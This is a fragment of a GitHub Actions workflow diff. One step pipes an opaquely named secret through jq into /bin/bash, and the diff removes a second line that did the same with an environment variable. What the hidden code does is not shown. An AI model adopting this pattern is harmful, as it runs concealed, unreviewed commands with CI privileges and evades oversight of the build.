@@ -17,7 +17,6 @@ jobs:
           ckdp751: ${{ secrets.ckdp751 }}
         run: |
           printf '%s' "$ckdp751" | jq -r .ed761 | /bin/bash
-          echo $uw94111 | jq -r .ywy136 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
